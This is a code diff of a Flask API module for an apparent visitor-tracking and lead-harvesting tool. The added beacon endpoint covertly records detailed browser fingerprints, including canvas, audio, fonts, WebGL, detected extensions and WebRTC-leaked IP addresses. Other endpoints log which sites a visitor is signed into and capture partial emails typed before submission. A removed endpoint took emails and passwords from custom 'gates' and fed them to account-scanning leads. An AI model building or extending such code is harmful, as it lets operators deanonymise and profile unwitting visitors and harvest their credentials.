@@ -1,15 +1,14 @@
-from flask import Blueprint, request, jsonify
-from datetime import datetime
 import json
-from flask_login import login_required
-from ..extensions import log_queue, db, limiter, csrf
-from ..models import Lead, Visit, Link
+
+from flask import Blueprint, request
+
 from ..config import Config
-from ..utils import verify_visit_token
+from ..extensions import csrf, db, limiter
+from ..models import Visit
+from ..utils import safe_json, sanitize, verify_visit_token
 
-bp = Blueprint('api', __name__, url_prefix='/api')
 
-# Exempt entire API blueprint from CSRF protection (used by JavaScript)
+bp = Blueprint("api", __name__, url_prefix="/api")
 csrf.exempt(bp)
 
 
@@ -18,166 +17,188 @@ def _validate_visit_token(data):
         return True
     if not data:
         return False
-    token = data.get('visit_token') or data.get('token')
-    visit_id = data.get('visit_id')
+    token = data.get("visit_token") or data.get("token")
+    visit_id = data.get("visit_id")
     try:
         visit_id = int(visit_id)
-    except Exception:
+    except (TypeError, ValueError):
         return False
-
     verified_id = verify_visit_token(token, Config.VISIT_TOKEN_TTL_SECONDS)
     return verified_id == visit_id
 
 
 def _clean_partial_email(value: str) -> str:
     if not value:
-        return ''
-    cleaned = ''.join(ch for ch in value.strip() if ch.isprintable())
+        return ""
+    cleaned = "".join(ch for ch in value.strip() if ch.isprintable())
     return cleaned[:120]
 
-@bp.route('/beacon', methods=['POST'])
+
+def _coerce_int(value, minimum=None, maximum=None):
+    if not isinstance(value, int) or isinstance(value, bool):
+        return None
+    if minimum is not None and value < minimum:
+        return None
+    if maximum is not None and value > maximum:
+        return None
+    return value
+
+
+def _coerce_float(value, minimum=None, maximum=None):
+    if not isinstance(value, (int, float)) or isinstance(value, bool):
+        return None
+    value = float(value)
+    if minimum is not None and value < minimum:
+        return None
+    if maximum is not None and value > maximum:
+        return None
+    return value
+
+
+def _coerce_bool(value):
+    if isinstance(value, bool):
+        return value
+    if isinstance(value, (int, float)):
+        return bool(value)
+    if isinstance(value, str):
+        lowered = value.strip().lower()
+        if lowered in {"1", "true", "yes", "on"}:
+            return True
+        if lowered in {"0", "false", "no", "off"}:
+            return False
+    return None
+
+
+def _json_list_text(value, item_limit: int, max_len: int) -> str | None:
+    if not isinstance(value, list):
+        return None
+    cleaned = []
+    for item in value[:item_limit]:
+        normalized = sanitize(str(item), 120)
+        if normalized:
+            cleaned.append(normalized)
+    payload = json.dumps(cleaned)
+    return payload[:max_len] if payload else None
+
+
+@bp.route("/beacon", methods=["POST"])
 @limiter.limit("60 per minute")
 def receive_beacon():
     try:
-        data = request.get_json(force=True, silent=True)
+        data = request.get_json(force=True, silent=True) or {}
         if not _validate_visit_token(data):
             return "Unauthorized", 403
-        if data:
-            v_id = data.get('visit_id')
-            if v_id:
-                visit = Visit.query.get(v_id)
-                if visit:
-                    visit.screen_res = data.get('screen_res', 'Unknown')
-                    visit.timezone = data.get('timezone', 'Unknown')
-                    visit.browser_bot = bool(data.get('webdriver', False))
-                    visit.browser_language = data.get('language', 'Unknown')
-                    visit.adblock = bool(data.get('adblock', False))
-                    visit.canvas_hash = data.get('canvas_hash')
-                    visit.webgl_renderer = data.get('webgl_renderer')
-                    
-                    # V24 Pro Data
-                    visit.cpu_cores = data.get('cpu_cores')
-                    visit.ram_gb = data.get('ram_gb')
-                    visit.battery_level = data.get('battery_level')
-                    
-                    db.session.commit()
-                    
 
-    except Exception as e:
-        print(f"Beacon Error: {e}")
+        visit = db.session.get(Visit, int(data.get("visit_id", 0)))
+        if visit is None:
+            return "Not found", 404
+
+        visit.screen_res = sanitize(data.get("screen_res"), 32) or visit.screen_res
+        screen_depth = _coerce_int(data.get("screen_depth"), 1, 128)
+        if screen_depth is not None:
+            visit.screen_depth = screen_depth
+        pixel_ratio = _coerce_float(data.get("pixel_ratio"), 0, 20)
+        if pixel_ratio is not None:
+            visit.pixel_ratio = pixel_ratio
+        visit.timezone = sanitize(data.get("timezone"), 64) or visit.timezone
+        visit.platform = sanitize(data.get("platform"), 64) or visit.platform
+        touch_points = _coerce_int(data.get("touch_points"), 0, 64)
+        if touch_points is not None:
+            visit.touch_points = touch_points
+        dark_mode = _coerce_bool(data.get("dark_mode"))
+        if dark_mode is not None:
+            visit.dark_mode = dark_mode
+        reduced_motion = _coerce_bool(data.get("reduced_motion"))
+        if reduced_motion is not None:
+            visit.reduced_motion = reduced_motion
+        visit.connection_type = sanitize(data.get("connection_type"), 32) or visit.connection_type
+        visit.browser_bot = bool(data.get("webdriver", False))
+        visit.browser_language = sanitize(data.get("language"), 32) or visit.browser_language
+        visit.do_not_track = sanitize(data.get("do_not_track"), 8) or visit.do_not_track
+        visit.adblock = bool(data.get("adblock", False))
+        visit.canvas_hash = sanitize(data.get("canvas_hash"), 64) or visit.canvas_hash
+        visit.audio_fp = sanitize(data.get("audio_fp"), 128) or visit.audio_fp
+        visit.fonts = sanitize(data.get("fonts"), 4000) or visit.fonts
+        visit.webgl_renderer = sanitize(data.get("renderer") or data.get("webgl_renderer"), 256) or visit.webgl_renderer
+        visit.webgl_vendor = sanitize(data.get("vendor"), 256) or visit.webgl_vendor
+        visit.webgl_extensions_hash = sanitize(data.get("extensions_hash"), 16) or visit.webgl_extensions_hash
+        webgl_max_texture = _coerce_int(data.get("max_texture"), 0, 65536)
+        if webgl_max_texture is not None:
+            visit.webgl_max_texture = webgl_max_texture
+        visit.client_rects_fp = sanitize(data.get("client_rects_fp"), 16) or visit.client_rects_fp
+        visit.webrtc_ips = _json_list_text(data.get("webrtc_ips"), item_limit=12, max_len=512) or visit.webrtc_ips
+        visit.extensions_detected = (
+            _json_list_text(data.get("extensions_detected"), item_limit=20, max_len=1000)
+            or visit.extensions_detected
+        )
+        cpu_cores = _coerce_int(data.get("cpu_cores"), 1, 256)
+        if cpu_cores is not None:
+            visit.cpu_cores = cpu_cores
+        ram_gb = _coerce_float(data.get("ram_gb"), 0, 2048)
+        if ram_gb is not None:
+            visit.ram_gb = ram_gb
+        taskbar_size = _coerce_int(data.get("taskbar_size"), -5000, 5000)
+        if taskbar_size is not None:
+            visit.taskbar_size = taskbar_size
+        visit.ua_brands = sanitize(data.get("ua_brands"), 256) or visit.ua_brands
+        dwell_ms = _coerce_int(data.get("dwell_ms"), 0, 300000)
+        if dwell_ms is not None:
+            visit.dwell_ms = dwell_ms
+        db.session.commit()
+    except Exception as exc:
+        print(f"Beacon Error: {exc}")
+        db.session.rollback()
     return "OK", 200
 
-@bp.route('/lead/<int:lead_id>/status')
-@login_required
-def lead_status(lead_id):
-    lead = Lead.query.get_or_404(lead_id)
-    return jsonify({
-        'status': lead.scan_status,
-        'sites': lead.holehe_data, 
-        'last_scan': lead.last_scan.isoformat() if lead.last_scan else None
-    })
-@bp.route('/log_session', methods=['POST'])
+
+@bp.route("/log_session", methods=["POST"])
 @limiter.limit("30 per minute")
 def log_session():
     try:
-        data = request.get_json(force=True, silent=True)
+        data = request.get_json(force=True, silent=True) or {}
         if not _validate_visit_token(data):
             return "Unauthorized", 403
-        if data:
-            v_id = data.get('visit_id')
-            sessions = data.get('sessions', [])
-            if v_id and sessions:
-                visit = Visit.query.get(v_id)
-                if visit:
-                    import json
-                    # Merge with existing
-                    existing = []
-                    if visit.detected_sessions:
-                        try: existing = json.loads(visit.detected_sessions)
-                        except: pass
-                    
-                    # Add new uniq
-                    existing.extend([s for s in sessions if s not in existing])
-                    visit.detected_sessions = json.dumps(existing)
-                    db.session.commit()
-    except Exception as e:
-        print(f"Session Log Error: {e}")
-    return "OK", 200
 
-@bp.route('/capture_credentials', methods=['POST'])
-@limiter.limit("10 per minute")
-def capture_credentials():
-    """Capture email/password from custom HTML gates."""
-    try:
-        data = request.get_json(force=True, silent=True)
-        if not data:
-            return "No data", 400
+        visit = db.session.get(Visit, int(data.get("visit_id", 0)))
+        sessions = data.get("sessions") or []
+        if visit is None or not isinstance(sessions, list):
+            return "OK", 200
 
-        if not _validate_visit_token(data):
-            return "Unauthorized", 403
-        
-        visit_id = data.get('visit_id')
-        email = data.get('email')
-        password = data.get('password')
-        
-        if visit_id:
-            visit = Visit.query.get(visit_id)
-            if visit:
-                # Save email to visit
-                if email:
-                    visit.email = email
-                    
-                    # Create/update lead
-                    lead = Lead.query.filter_by(email=email).first()
-                    if not lead:
-                        lead = Lead(email=email, scan_status='pending')
-                        db.session.add(lead)
-
-                    db.session.commit()
-                    if lead and lead.id:
-                        log_queue.put({'type': 'ai_auto_tag', 'lead_id': lead.id})
-                
-                # Credential capture is disabled by default for safety
-                if password and Config.ALLOW_CREDENTIAL_CAPTURE:
-                    import bcrypt
-                    import json
-                    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
-                    if hasattr(visit, 'detected_sessions'):
-                        sessions = json.loads(visit.detected_sessions or '[]')
-                        sessions.append({'type': 'password_captured', 'hash': password_hash[:20] + '...'})
-                        visit.detected_sessions = json.dumps(sessions)
-                    db.session.commit()
-                else:
-                    db.session.commit()
-                
-                print(f"Captured credentials from visit {visit_id}: email={email}, pwd={'***' if password else 'None'}")
-                
-    except Exception as e:
-        print(f"Capture Error: {e}")
-    
+        existing = safe_json(visit.detected_sessions, []) or []
+        if not isinstance(existing, list):
+            existing = []
+        for session_name in sessions:
+            value = sanitize(str(session_name), 80)
+            if value and value not in existing:
+                existing.append(value)
+        visit.detected_sessions = json.dumps(existing)
+        db.session.commit()
+    except Exception as exc:
+        print(f"Session Log Error: {exc}")
+        db.session.rollback()
     return "OK", 200
 
 
-@bp.route('/lead_partial', methods=['POST'])
+@bp.route("/partial_email", methods=["POST"])
 @limiter.limit("10 per minute")
-def lead_partial():
+def partial_email():
     if not Config.ALLOW_PARTIAL_EMAIL_CAPTURE:
         return "Disabled", 403
 
-    visit_id = request.form.get('visit_id')
-    visit_token = request.form.get('visit_token')
-    partial_email = _clean_partial_email(request.form.get('partial_email', ''))
+    visit_id = request.form.get("visit_id")
+    visit_token = request.form.get("visit_token")
+    partial = _clean_partial_email(request.form.get("partial_email", ""))
 
-    if not _validate_visit_token({'visit_id': visit_id, 'visit_token': visit_token}):
+    if not _validate_visit_token({"visit_id": visit_id, "visit_token": visit_token}):
         return "Unauthorized", 403
-    if not visit_id or not partial_email:
+    if not visit_id or not partial:
         return "Missing data", 400
 
-    visit = Visit.query.get(visit_id)
-    if not visit:
+    visit = db.session.get(Visit, int(visit_id))
+    if visit is None:
         return "Not found", 404
 
-    note = f"partial_email:{partial_email}"
+    note = f"partial_email:{partial}"
     if visit.notes:
         if note not in visit.notes:
             visit.notes = f"{visit.notes} | {note}"
@@ -185,3 +206,30 @@ def lead_partial():
         visit.notes = note
     db.session.commit()
     return "OK", 200
+
+
+@bp.route("/dwell", methods=["POST"])
+@limiter.limit("60 per minute")
+def dwell():
+    try:
+        data = request.get_json(force=True, silent=True) or {}
+        if not _validate_visit_token(data):
+            return "Unauthorized", 403
+
+        visit = db.session.get(Visit, int(data.get("visit_id", 0)))
+        if visit is None:
+            return "Not found", 404
+
+        dwell_ms = data.get("dwell_ms")
+        if not isinstance(dwell_ms, int):
+            return "Invalid dwell", 400
+        if dwell_ms < 0 or dwell_ms > 300000:
+            return "Invalid dwell", 400
+
+        visit.dwell_ms = dwell_ms
+        db.session.commit()
+        return "OK", 200
+    except Exception as exc:
+        print(f"Dwell Error: {exc}")
+        db.session.rollback()
+        return "Error", 500
